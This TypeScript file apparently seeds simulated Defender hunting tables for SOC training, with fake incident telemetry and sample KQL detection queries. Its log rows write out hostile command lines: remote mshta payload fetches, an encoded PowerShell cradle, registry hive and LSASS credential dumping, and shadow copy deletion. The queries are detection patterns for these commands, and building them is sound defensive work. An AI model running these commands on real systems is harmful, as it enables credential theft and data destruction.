import { SHA256 } from "./publicMalwareSamples";
import { DEFENDER_INCIDENTS } from "./defenderIncidents";
import type { KqlRow, KqlTables, KqlTableSchema } from "../lib/kql";

/**
 * In-memory Microsoft Defender Advanced Hunting tables, seeded deterministically
 * from the incident catalog plus explicit teaching rows (brute-force logons,
 * encoded PowerShell, DNS tunneling). No randomness — stable across reloads.
 */

export const DEFENDER_HUNTING_SCHEMA: KqlTableSchema[] = [
  {
    name: "DeviceProcessEvents",
    description: "Process creation events from onboarded devices.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "DeviceName", type: "string" },
      { name: "AccountName", type: "string" },
      { name: "FileName", type: "string" },
      { name: "ProcessCommandLine", type: "string" },
      { name: "InitiatingProcessFileName", type: "string" },
      { name: "SHA256", type: "string" },
    ],
  },
  {
    name: "DeviceNetworkEvents",
    description: "Network connections initiated by devices.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "DeviceName", type: "string" },
      { name: "RemoteIP", type: "string" },
      { name: "RemotePort", type: "int" },
      { name: "RemoteUrl", type: "string" },
      { name: "InitiatingProcessFileName", type: "string" },
      { name: "ActionType", type: "string" },
    ],
  },
  {
    name: "DeviceLogonEvents",
    description: "Sign-ins (success/failure) observed on devices.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "DeviceName", type: "string" },
      { name: "AccountName", type: "string" },
      { name: "LogonType", type: "string" },
      { name: "ActionType", type: "string" },
      { name: "RemoteIP", type: "string" },
      { name: "FailureReason", type: "string" },
    ],
  },
  {
    name: "DeviceFileEvents",
    description: "File create/modify events on devices.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "DeviceName", type: "string" },
      { name: "FileName", type: "string" },
      { name: "FolderPath", type: "string" },
      { name: "SHA256", type: "string" },
      { name: "ActionType", type: "string" },
      { name: "InitiatingProcessAccountName", type: "string" },
    ],
  },
  {
    name: "EmailEvents",
    description: "Email flow events from Defender for Office 365.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "SenderFromAddress", type: "string" },
      { name: "RecipientEmailAddress", type: "string" },
      { name: "Subject", type: "string" },
      { name: "DeliveryAction", type: "string" },
      { name: "ThreatTypes", type: "string" },
      { name: "AttachmentCount", type: "int" },
    ],
  },
  {
    name: "EmailUrlInfo",
    description: "URLs embedded in emails.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "Url", type: "string" },
      { name: "UrlDomain", type: "string" },
      { name: "RecipientEmailAddress", type: "string" },
    ],
  },
  {
    name: "IdentityLogonEvents",
    description: "Identity sign-ins from Entra ID / Defender for Identity.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "AccountUpn", type: "string" },
      { name: "LogonType", type: "string" },
      { name: "Location", type: "string" },
      { name: "IPAddress", type: "string" },
      { name: "ActionType", type: "string" },
      { name: "Application", type: "string" },
    ],
  },
  {
    name: "CloudAppEvents",
    description: "Activities from Defender for Cloud Apps.",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "AccountUpn", type: "string" },
      { name: "Application", type: "string" },
      { name: "ActionType", type: "string" },
      { name: "ActivityType", type: "string" },
      { name: "IPAddress", type: "string" },
    ],
  },
  {
    name: "AlertInfo",
    description: "Alerts across all Defender workloads (auto-derived from incidents).",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "AlertId", type: "string" },
      { name: "Title", type: "string" },
      { name: "Severity", type: "string" },
      { name: "Category", type: "string" },
      { name: "ServiceSource", type: "string" },
      { name: "DetectionSource", type: "string" },
      { name: "IncidentId", type: "string" },
    ],
  },
  {
    name: "AlertEvidence",
    description: "Entities tied to each alert (auto-derived from incidents).",
    columns: [
      { name: "Timestamp", type: "datetime" },
      { name: "AlertId", type: "string" },
      { name: "EntityType", type: "string" },
      { name: "EntityValue", type: "string" },
      { name: "IncidentId", type: "string" },
    ],
  },
];

// Helper to add minutes to an ISO timestamp deterministically.
function plusMinutes(iso: string, mins: number): string {
  return new Date(new Date(iso).getTime() + mins * 60000).toISOString().slice(0, 19) + "Z";
}

const deviceProcessEvents: KqlRow[] = [
  { Timestamp: "2026-05-29T12:55:00Z", DeviceName: "HR-LAPTOP-04", AccountName: "sarah.chen", FileName: "mshta.exe", ProcessCommandLine: "mshta.exe http://onedrive-secure-preview.net/p.hta", InitiatingProcessFileName: "explorer.exe", SHA256: "" },
  { Timestamp: "2026-05-29T12:58:00Z", DeviceName: "HR-LAPTOP-04", AccountName: "sarah.chen", FileName: "AsyncRAT.exe", ProcessCommandLine: "AsyncRAT.exe", InitiatingProcessFileName: "mshta.exe", SHA256: SHA256.ASYNC_RAT },
  { Timestamp: "2026-05-29T09:47:00Z", DeviceName: "SALES-VM-22", AccountName: "d.patel", FileName: "powershell.exe", ProcessCommandLine: "powershell.exe -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0AC...", InitiatingProcessFileName: "winword.exe", SHA256: "" },
  { Timestamp: "2026-05-29T09:48:00Z", DeviceName: "SALES-VM-22", AccountName: "d.patel", FileName: "Emotet.dll", ProcessCommandLine: "rundll32.exe Emotet.dll,Control_RunDLL", InitiatingProcessFileName: "powershell.exe", SHA256: SHA256.EMOTET },
  { Timestamp: "2026-05-29T05:12:00Z", DeviceName: "POLC-MJ0LQLRR", AccountName: "dapqa", FileName: "reg.exe", ProcessCommandLine: "reg save HKLM\\SYSTEM system.hiv", InitiatingProcessFileName: "cmd.exe", SHA256: "" },
  { Timestamp: "2026-05-29T05:40:00Z", DeviceName: "POLC-MJ0LQLRR", AccountName: "dapqa", FileName: "mshta.exe", ProcessCommandLine: "mshta.exe https://151.101.65.91/x", InitiatingProcessFileName: "explorer.exe", SHA256: "" },
  { Timestamp: "2026-05-27T19:30:00Z", DeviceName: "FIN-EXEC-01", AccountName: "m.rodriguez", FileName: "@WanaDecryptor@.exe", ProcessCommandLine: "@WanaDecryptor@.exe", InitiatingProcessFileName: "mssecsvc.exe", SHA256: SHA256.WANNACRY },
  { Timestamp: "2026-05-27T19:32:00Z", DeviceName: "FIN-EXEC-01", AccountName: "m.rodriguez", FileName: "vssadmin.exe", ProcessCommandLine: "vssadmin delete shadows /all /quiet", InitiatingProcessFileName: "cmd.exe", SHA256: "" },
  { Timestamp: "2026-05-28T11:40:00Z", DeviceName: "WEB-PROD-01", AccountName: "webservice", FileName: "java.exe", ProcessCommandLine: "java -cp app.jar Main", InitiatingProcessFileName: "containerd", SHA256: "" },
  { Timestamp: "2026-05-28T14:20:00Z", DeviceName: "DEV-SERVER-03", AccountName: "administrator", FileName: "PSEXESVC.exe", ProcessCommandLine: "PSEXESVC.exe", InitiatingProcessFileName: "services.exe", SHA256: "" },
  { Timestamp: "2026-05-29T07:45:00Z", DeviceName: "DC01", AccountName: "administrator", FileName: "lsass.exe", ProcessCommandLine: "rundll32 comsvcs.dll MiniDump", InitiatingProcessFileName: "cmd.exe", SHA256: "" },
  { Timestamp: "2026-05-29T14:00:00Z", DeviceName: "SOC-ANALYST-02", AccountName: "intern.soc", FileName: "eicar.com", ProcessCommandLine: "eicar.com", InitiatingProcessFileName: "explorer.exe", SHA256: SHA256.EICAR },
  { Timestamp: "2026-05-29T08:20:00Z", DeviceName: "IT-DESK-15", AccountName: "h.singh", FileName: "SupportAssist.exe", ProcessCommandLine: "SupportAssist.exe /scan", InitiatingProcessFileName: "services.exe", SHA256: SHA256.DELL_SUPPORT_ASSIST },
];

const deviceNetworkEvents: KqlRow[] = [
  { Timestamp: "2026-05-29T13:05:00Z", DeviceName: "HR-LAPTOP-04", RemoteIP: "185.234.218.116", RemotePort: 6606, RemoteUrl: "", InitiatingProcessFileName: "AsyncRAT.exe", ActionType: "ConnectionSuccess" },
  { Timestamp: "2026-05-29T09:51:00Z", DeviceName: "SALES-VM-22", RemoteIP: "91.240.118.168", RemotePort: 443, RemoteUrl: "invoicesystem.duckdns.org", InitiatingProcessFileName: "rundll32.exe", ActionType: "ConnectionSuccess" },
  { Timestamp: "2026-05-29T05:40:00Z", DeviceName: "POLC-MJ0LQLRR", RemoteIP: "151.101.65.91", RemotePort: 443, RemoteUrl: "", InitiatingProcessFileName: "mshta.exe", ActionType: "ConnectionSuccess" },
  { Timestamp: "2026-05-28T11:40:00Z", DeviceName: "WEB-PROD-01", RemoteIP: "203.0.113.47", RemotePort: 443, RemoteUrl: "", InitiatingProcessFileName: "java.exe", ActionType: "ConnectionSuccess" },
  { Timestamp: "2026-05-29T07:45:00Z", DeviceName: "DC01", RemoteIP: "203.0.113.47", RemotePort: 443, RemoteUrl: "", InitiatingProcessFileName: "rundll32.exe", ActionType: "ConnectionSuccess" },
];

// DNS tunneling rows — many long-subdomain queries to one domain (teaching: count())
const dnsTunnelRows: KqlRow[] = Array.from({ length: 30 }, (_, i) => ({
  Timestamp: plusMinutes("2026-05-28T21:10:00Z", i * 5),
  DeviceName: "RND-WS-09",
  RemoteIP: "8.8.8.8",
  RemotePort: 53,
  RemoteUrl: `a${i.toString(36)}b9f2c1e8d7${i}data.tunnel-c2.xyz`,
  InitiatingProcessFileName: "iodine.exe",
  ActionType: "DnsQuery",
}));
deviceNetworkEvents.push(...dnsTunnelRows);

// Brute-force logons — 26 failed RDP attempts then 1 success (teaching: count() > 20)
const bruteForceRows: KqlRow[] = [];
for (let i = 0; i < 26; i++) {
  bruteForceRows.push({
    Timestamp: plusMinutes("2026-05-29T02:18:00Z", i),
    DeviceName: "LAB-WS-0142",
    AccountName: "administrator",
    LogonType: "RemoteInteractive",
    ActionType: "LogonFailed",
    RemoteIP: "45.155.205.233",
    FailureReason: "BadPassword",
  });
}
bruteForceRows.push({
  Timestamp: "2026-05-29T02:47:00Z",
  DeviceName: "LAB-WS-0142",
  AccountName: "administrator",
  LogonType: "RemoteInteractive",
  ActionType: "LogonSuccess",
  RemoteIP: "45.155.205.233",
  FailureReason: "",
});

const deviceLogonEvents: KqlRow[] = [
  ...bruteForceRows,
  { Timestamp: "2026-05-28T14:20:00Z", DeviceName: "DC01", AccountName: "administrator", LogonType: "Network", ActionType: "LogonSuccess", RemoteIP: "10.0.0.44", FailureReason: "" },
  { Timestamp: "2026-05-29T08:00:00Z", DeviceName: "IT-DESK-15", AccountName: "h.singh", LogonType: "Interactive", ActionType: "LogonSuccess", RemoteIP: "10.10.2.15", FailureReason: "" },
];

const deviceFileEvents: KqlRow[] = [
  { Timestamp: "2026-05-29T12:58:00Z", DeviceName: "HR-LAPTOP-04", FileName: "AsyncRAT.exe", FolderPath: "C:\\Users\\sarah.chen\\AppData\\Local\\Temp", SHA256: SHA256.ASYNC_RAT, ActionType: "FileCreated", InitiatingProcessAccountName: "sarah.chen" },
  { Timestamp: "2026-05-29T09:48:00Z", DeviceName: "SALES-VM-22", FileName: "Emotet.dll", FolderPath: "C:\\ProgramData", SHA256: SHA256.EMOTET, ActionType: "FileCreated", InitiatingProcessAccountName: "d.patel" },
  { Timestamp: "2026-05-27T19:30:00Z", DeviceName: "FIN-EXEC-01", FileName: "@WanaDecryptor@.exe", FolderPath: "C:\\Windows", SHA256: SHA256.WANNACRY, ActionType: "FileCreated", InitiatingProcessAccountName: "m.rodriguez" },
  { Timestamp: "2026-05-29T14:00:00Z", DeviceName: "SOC-ANALYST-02", FileName: "eicar.com", FolderPath: "C:\\Users\\intern.soc\\Desktop", SHA256: SHA256.EICAR, ActionType: "FileCreated", InitiatingProcessAccountName: "intern.soc" },
  { Timestamp: "2026-05-28T11:40:00Z", DeviceName: "WEB-PROD-01", FileName: "beacon.dll", FolderPath: "/tmp", SHA256: "c64cc0cb8a3793f77395ef02506b12a80f089602534f3fb036d0bd10d94f29ee", ActionType: "FileCreated", InitiatingProcessAccountName: "webservice" },
];

const emailEvents: KqlRow[] = [
  { Timestamp: "2026-05-29T11:42:00Z", SenderFromAddress: "doc-share@sharedrive-verify.com", RecipientEmailAddress: "liam.walker@contoso.com", Subject: "Document shared with you", DeliveryAction: "Delivered", ThreatTypes: "Phish", AttachmentCount: 0 },
  { Timestamp: "2026-05-29T09:14:00Z", SenderFromAddress: "travel-ops@corp-expense-review.com", RecipientEmailAddress: "lucas.king@contoso.com", Subject: "Travel expense rejected", DeliveryAction: "Quarantined", ThreatTypes: "Malware", AttachmentCount: 1 },
  { Timestamp: "2026-05-29T07:05:00Z", SenderFromAddress: "security@microsoft.com", RecipientEmailAddress: "sam.patel@contoso.com", Subject: "Your Microsoft 365 digest", DeliveryAction: "Quarantined", ThreatTypes: "None", AttachmentCount: 0 },
  { Timestamp: "2026-01-12T10:00:00Z", SenderFromAddress: "billing-support@fake-google.com", RecipientEmailAddress: "bob.jones@contoso.com", Subject: "URGENT: Invoice #9921 Overdue", DeliveryAction: "Blocked", ThreatTypes: "Malware", AttachmentCount: 1 },
];

const emailUrlInfo: KqlRow[] = [
  { Timestamp: "2026-05-29T11:42:00Z", Url: "http://onedrive-secure-preview.net/doc", UrlDomain: "onedrive-secure-preview.net", RecipientEmailAddress: "liam.walker@contoso.com" },
  { Timestamp: "2026-05-29T09:14:00Z", Url: "http://expense-review-download.biz/open", UrlDomain: "expense-review-download.biz", RecipientEmailAddress: "lucas.king@contoso.com" },
];

const identityLogonEvents: KqlRow[] = [
  { Timestamp: "2026-05-29T02:18:00Z", AccountUpn: "elena.fisher@contoso.com", LogonType: "Interactive", Location: "Lagos, NG", IPAddress: "45.155.205.233", ActionType: "LogonFailed", Application: "Office 365" },
  { Timestamp: "2026-05-29T02:50:00Z", AccountUpn: "elena.fisher@contoso.com", LogonType: "Interactive", Location: "Lagos, NG", IPAddress: "45.155.205.233", ActionType: "LogonSuccess", Application: "Office 365" },
  { Timestamp: "2026-05-29T02:55:00Z", AccountUpn: "elena.fisher@contoso.com", LogonType: "Interactive", Location: "Frankfurt, DE", IPAddress: "203.0.113.54", ActionType: "LogonSuccess", Application: "Office 365" },
  { Timestamp: "2026-05-29T06:05:00Z", AccountUpn: "hr.analyst@contoso.com", LogonType: "Network", Location: "New York, US", IPAddress: "10.20.1.12", ActionType: "LogonSuccess", Application: "Kerberos" },
];

const cloudAppEvents: KqlRow[] = [
  { Timestamp: "2026-05-28T15:44:00Z", AccountUpn: "p.nguyen@contoso.com", Application: "PerfectData Software", ActionType: "Consent to application", ActivityType: "OAuth2:Authorize", IPAddress: "104.21.5.178" },
  { Timestamp: "2026-05-28T16:02:00Z", AccountUpn: "p.nguyen@contoso.com", Application: "PerfectData Software", ActionType: "Add app role assignment", ActivityType: "ServicePrincipal", IPAddress: "104.21.5.178" },
  { Timestamp: "2026-05-29T03:01:00Z", AccountUpn: "elena.fisher@contoso.com", Application: "Exchange Online", ActionType: "New-InboxRule", ActivityType: "MailForwarding", IPAddress: "203.0.113.54" },
];

// Derive AlertInfo + AlertEvidence from the incident catalog so they always match.
const alertInfo: KqlRow[] = [];
const alertEvidence: KqlRow[] = [];
DEFENDER_INCIDENTS.forEach((inc) => {
  inc.alerts.forEach((a) => {
    alertInfo.push({
      Timestamp: a.firstActivity,
      AlertId: a.id,
      Title: a.title,
      Severity: a.severity,
      Category: a.category,
      ServiceSource: a.serviceSource,
      DetectionSource: a.detectionSource,
      IncidentId: inc.id,
    });
    a.entities.forEach((e) => {
      alertEvidence.push({
        Timestamp: a.firstActivity,
        AlertId: a.id,
        EntityType: /@/.test(e) ? "Account" : /^\d+\.\d+\.\d+\.\d+$/.test(e) ? "Ip" : /\.[a-z]{2,}$/.test(e) ? "Url" : "Other",
        EntityValue: e,
        IncidentId: inc.id,
      });
    });
  });
});

export const DEFENDER_HUNTING_TABLES: KqlTables = {
  DeviceProcessEvents: deviceProcessEvents,
  DeviceNetworkEvents: deviceNetworkEvents,
  DeviceLogonEvents: deviceLogonEvents,
  DeviceFileEvents: deviceFileEvents,
  EmailEvents: emailEvents,
  EmailUrlInfo: emailUrlInfo,
  IdentityLogonEvents: identityLogonEvents,
  CloudAppEvents: cloudAppEvents,
  AlertInfo: alertInfo,
  AlertEvidence: alertEvidence,
};

export interface SavedHuntQuery {
  id: string;
  name: string;
  description: string;
  query: string;
}

export const DEFENDER_SAMPLE_QUERIES: SavedHuntQuery[] = [
  { id: "q1", name: "Encoded PowerShell launched by Office", description: "Macro → PowerShell download cradle.", query: 'DeviceProcessEvents\n| where FileName == "powershell.exe"\n| where ProcessCommandLine contains "-enc"' },
  { id: "q2", name: "RDP brute force (failed logons > 20)", description: "Failed sign-ins grouped by account + source IP.", query: 'DeviceLogonEvents\n| where ActionType == "LogonFailed"\n| summarize count() by AccountName, RemoteIP\n| where count_ > 20' },
  { id: "q3", name: "DNS tunneling candidates", description: "High-volume DNS queries to one domain.", query: 'DeviceNetworkEvents\n| where ActionType == "DnsQuery"\n| summarize count() by DeviceName, RemoteUrl\n| top 10 by count_' },
  { id: "q4", name: "AsyncRAT hash sightings", description: "Find the AsyncRAT SHA-256 across file events.", query: `DeviceFileEvents\n| where SHA256 == "${SHA256.ASYNC_RAT}"` },
  { id: "q5", name: "Outbound C2 to malicious IP", description: "Connections to the Cobalt Strike team server.", query: 'DeviceNetworkEvents\n| where RemoteIP == "203.0.113.47"' },
  { id: "q6", name: "Phishing emails delivered to inbox", description: "Phish that bypassed filtering.", query: 'EmailEvents\n| where ThreatTypes == "Phish"\n| where DeliveryAction == "Delivered"' },
  { id: "q7", name: "Impossible travel sign-ins", description: "Successful identity logons by location.", query: 'IdentityLogonEvents\n| where ActionType == "LogonSuccess"\n| project Timestamp, AccountUpn, Location, IPAddress' },
  { id: "q8", name: "Risky OAuth consents", description: "App consent grants in Cloud Apps.", query: 'CloudAppEvents\n| where ActionType contains "Consent"' },
  { id: "q9", name: "Credential dumping (reg save / lsass)", description: "SAM/LSASS access attempts.", query: 'DeviceProcessEvents\n| where ProcessCommandLine contains "HKLM\\\\SYSTEM" or ProcessCommandLine contains "comsvcs.dll"' },
  { id: "q10", name: "Shadow copy deletion (ransomware)", description: "vssadmin delete shadows.", query: 'DeviceProcessEvents\n| where ProcessCommandLine contains "delete shadows"' },
  { id: "q11", name: "High severity alerts by source", description: "Where are high alerts coming from?", query: 'AlertInfo\n| where Severity == "High"\n| summarize count() by DetectionSource' },
  { id: "q12", name: "All alerts for an incident", description: "Pivot AlertEvidence by incident id.", query: 'AlertEvidence\n| where IncidentId == "DINC-0012"' },
];
